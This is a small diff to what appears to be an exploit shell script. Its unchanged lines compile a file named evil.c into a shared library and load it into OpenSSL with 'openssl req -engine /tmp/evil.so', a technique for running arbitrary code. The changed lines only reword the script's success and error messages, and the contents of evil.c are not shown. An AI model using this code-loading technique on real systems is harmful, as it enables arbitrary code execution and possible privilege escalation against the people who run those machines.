@@ -17,7 +17,7 @@ EOF
 	gcc -fPIC evil.c -o evil.o
 	gcc -shared -o evil.so -lcrypto evil.o
 	openssl req -engine /tmp/evil.so
-	printf "success\n" && exit 0
+	printf "success...\n" && exit 0
 else
-	printf "error\n" && exit 1
+	printf "something's wrong in here somewhere...\n" && exit 1
 fi
